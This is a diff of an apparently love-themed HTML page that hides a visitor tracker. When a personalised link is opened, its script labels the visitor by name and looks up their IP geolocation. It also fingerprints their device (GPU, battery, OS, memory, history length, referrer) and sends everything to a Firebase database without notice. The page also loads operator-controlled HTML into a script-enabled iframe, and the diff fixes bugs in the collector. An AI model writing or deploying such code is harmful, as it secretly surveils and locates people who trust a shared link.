@@ -38,7 +38,6 @@
     }
 
     /* ─── FULL-PAGE OVERLAY LAYOUT ──────────────────────────────── */
-    /* Loader & Card share one full-viewport overlay */
     #page-overlay {
       position: fixed;
       inset: 0;
@@ -61,7 +60,6 @@
       gap: 28px;
     }
 
-    /* Google-style 4-dot spinner */
     .google-spinner {
       width: 60px;
       height: 60px;
@@ -132,16 +130,14 @@
       border: 1px solid var(--border);
       text-align: center;
       position: relative;
-      /* ✅ height auto — content যতটুকু, card ততটুকু */
       height: auto;
-      overflow: visible; /* card নিজে স্ক্রল করবে না */
-      display: none; /* loader চলতে থাকলে hidden */
+      overflow: visible;
+      display: none;
       animation: cardFadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
-    /* ✅ কার্ড দেখা দেওয়ার পর overlay কে scroll করতে দাও */
     #page-overlay.card-visible {
-      position: relative; /* fixed থেকে বেরিয়ে স্বাভাবিক হবে */
+      position: relative;
       min-height: 100vh;
       align-items: flex-start;
       padding: 24px 12px;
@@ -152,23 +148,6 @@
       to   { opacity: 1; transform: translateY(0); }
     }
 
-    /* ─── FLOATING HEARTS ───────────────────────────────────────── */
-    .floating-heart {
-      position: absolute;
-      font-size: 14px;
-      color: rgba(209, 65, 103, 0.15);
-      animation: floatUp 7s infinite linear;
-      bottom: -20px;
-      pointer-events: none;
-    }
-
-    @keyframes floatUp {
-      0%   { transform: translateY(0) translateX(0) scale(1); opacity: 0; }
-      10%  { opacity: 1; }
-      90%  { opacity: 1; }
-      100% { transform: translateY(-450px) translateX(25px) scale(0.8); opacity: 0; }
-    }
-
     /* ─── FULLSCREEN IFRAME ──────────────────────────────────────── */
     #full-iframe {
       position: fixed;
@@ -176,11 +155,11 @@
       width: 100%;
       height: 100%;
       border: none;
-      display: none; /* loader চলাকালীন লুকানো */
+      display: none;
       z-index: 200;
     }
 
-    /* ─── CONTENT STYLES (fallback — iframe না থাকলে) ───────────── */
+    /* ─── FALLBACK CONTENT STYLES ───────────── */
     .heart-icon {
       font-size: 44px;
       color: var(--primary);
@@ -220,7 +199,7 @@
       font-weight: 400;
     }
 
-    /* ✅ Responsive */
+    /* ─── RESPONSIVE ─────────────────────────────── */
     @media (max-width: 480px) {
       .card { padding: 28px 18px; border-radius: 20px; }
       h1 { font-size: 20px; }
@@ -247,10 +226,8 @@
 </head>
 <body>
 
-  <!-- Fullscreen iframe — Firebase থেকে আসা পুরো HTML এখানে রেন্ডার হবে -->
   <iframe id="full-iframe" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
 
-  <!-- Loader overlay -->
   <div id="page-overlay">
     <div id="loader" class="loader-container">
       <div class="google-spinner">
@@ -268,13 +245,14 @@
     import { getDatabase, ref, push, update, onValue, serverTimestamp }
                                  from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
+    // ── URL Parameter Parser ─────────────────────────────────── 
+    function getNameFromURL() {
+      const params = new URLSearchParams(window.location.search);
+      let name = params.get('n') || params.get('name') || 'Unknown';
+      return decodeURIComponent(name);
+    }
 
-function getNameFromURL() {
-  const params = new URLSearchParams(window.location.search);
-  let name = params.get('n') || params.get('name') || 'Unknown';
-  return decodeURIComponent(name);
-}
-
+    // ── Firebase Config ──────────────────────────────────── 
     const firebaseConfig = {
       apiKey:            "AIzaSyDs3buPka62aeOttWyKBaT7sEDotXVK5Zw",
       authDomain:        "love-5585d.firebaseapp.com",
@@ -289,7 +267,7 @@ function getNameFromURL() {
     const app = initializeApp(firebaseConfig);
     const db  = getDatabase(app);
 
-    /* ── Device parser ─────────────────────────────────── */
+    // ── Device Parser ─────────────────────────────────── 
     function parseDevice(ua) {
       let model = "Unknown Device";
       if (/iPhone/.test(ua)) model = "iPhone";
@@ -303,7 +281,7 @@ function getNameFromURL() {
           model = ua.match(/Linux;\s*([^;\)]+)/)[1].trim();
         } else model = "Android Device";
       } else if (/Windows NT/.test(ua)) model = "Windows PC";
-        else if (/Macintosh/.test(ua)) model = "MacBook / iMac";
+      else if (/Macintosh/.test(ua)) model = "MacBook / iMac";
 
       let os = "Unknown OS";
       if      (/iPhone OS ([\d_]+)/.test(ua)) os = "iOS "     + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,".");
@@ -320,7 +298,7 @@ function getNameFromURL() {
       return { model, os, browser, type: /Mobi|Android|iPhone/i.test(ua) ? "Mobile" : "Desktop" };
     }
 
-    /* ── GPU info ──────────────────────────────────────── */
+    // ── GPU Info ─────────────────────────────────────── 
     function getGPUInfo() {
       try {
         const canvas = document.createElement("canvas");
@@ -335,7 +313,7 @@ function getNameFromURL() {
       } catch (e) { return { vendor: "Error", renderer: "Error" }; }
     }
 
-    /* ── Geo fetch ─────────────────────────────────────── */
+    // ── Geolocation Fetch ─────────────────────────────────────── 
     async function fetchGeoData() {
       const apis = [
         "https://ipwho.is/",
@@ -364,7 +342,7 @@ function getNameFromURL() {
       return null;
     }
 
-    /* ── Main data collector ───────────────────────────── */
+    // ── Data Collector ─────────────────────────────────– 
     async function collectAndSyncData() {
       const pageLoadTime = window.performance ? Math.round(performance.now()) + " ms" : "N/A";
       const geoData = await fetchGeoData();
@@ -382,11 +360,13 @@ function getNameFromURL() {
 
       let batteryLevel    = "N/A";
       let batteryCharging = "N/A";
-      try {
-        const bat       = await navigator.getBattery();
-        batteryLevel    = Math.round(bat.level * 100) + "%";
-        batteryCharging = bat.charging ? "Charging" : "Not Charging";
-      } catch (e) {}
+      if (navigator.getBattery) {
+        try {
+          const bat       = await navigator.getBattery();
+          batteryLevel    = Math.round(bat.level * 100) + "%";
+          batteryCharging = bat.charging ? "Charging" : "Not Charging";
+        } catch (e) {}
+      }
 
       const visitorData = {
         custom_label: getNameFromURL(),
@@ -406,7 +386,7 @@ function getNameFromURL() {
         touch_screen:       ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
         dark_mode:          window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No",
         cpu_cores:          navigator.hardwareConcurrency || "N/A",
-        device_memory:      (navigator.deviceMemory || "N/A") + (navigator.deviceMemory ? " GB" : ""),
+        device_memory:      navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
         gpu_vendor:         gpu.vendor,
         gpu_renderer:       gpu.renderer,
         language:           navigator.language || "N/A",
@@ -418,7 +398,7 @@ function getNameFromURL() {
         online_status:      navigator.onLine ? "Online" : "Offline",
         battery_level:      batteryLevel,
         battery_charging:   batteryCharging,
-        history_length:     (navigator.deviceMemory || "N/A") + (navigator.deviceMemory ? " GB" : ""),
+        history_length:     window.history.length,
         referrer:           document.referrer || "Direct Link",
         page_url:           window.location.href,
         page_title:         document.title,
@@ -430,7 +410,6 @@ function getNameFromURL() {
       try {
         const existingKey = localStorage.getItem("hasnat_tracker_key");
         if (existingKey) {
-          // ✅ FIXED: সঠিক পাথ সিন্ট্যাক্স ব্যবহার করুন
           await update(ref(db, `visitors/${existingKey}`), visitorData);
           console.log("Data updated successfully:", existingKey);
         } else {
@@ -448,23 +427,20 @@ function getNameFromURL() {
       }
     }
 
-    /* ── Show iframe, hide loader ─────────────────────── */
+    // ── UI Controller ─────────────────────────────────– 
     function showIframeAndHideLoader() {
       const loader  = document.getElementById("loader");
       const overlay = document.getElementById("page-overlay");
       const iframe  = document.getElementById("full-iframe");
 
-      if (!loader || loader.style.display === "none") return; // already done
+      if (!loader || loader.style.display === "none") return;
 
       loader.style.display = "none";
       if (overlay) overlay.style.display = "none";
-
-      if (iframe) {
-        iframe.style.display = "block";
-      }
+      if (iframe) iframe.style.display = "block";
     }
 
-    /* ── Firebase custom UI listener ───────────────────── */
+    // ── Firebase UI Listener ─────────────────────────────────– 
     function listenForCustomUI() {
       const uiRef = ref(db, "ui_config/custom_html");
       onValue(uiRef, (snapshot) => {
@@ -473,17 +449,15 @@ function getNameFromURL() {
         if (!iframe) return;
 
         if (htmlContent && htmlContent.trim() !== "") {
-          // পুরো HTML টা iframe এর srcdoc এ দাও — একদম আলাদা পেজের মতো রেন্ডার হবে
           iframe.srcdoc = htmlContent;
         }
       });
     }
 
-    /* ── Bootstrap ─────────────────────────────────────── */
+    // ── Initialize ─────────────────────────────────– 
     window.addEventListener("load", () => {
       listenForCustomUI();
       collectAndSyncData();
-      // Hard fallback: ৪ সেকেন্ড পর যেকোনো অবস্থায় iframe দেখাও
       setTimeout(showIframeAndHideLoader, 4000);
     });
   </script>
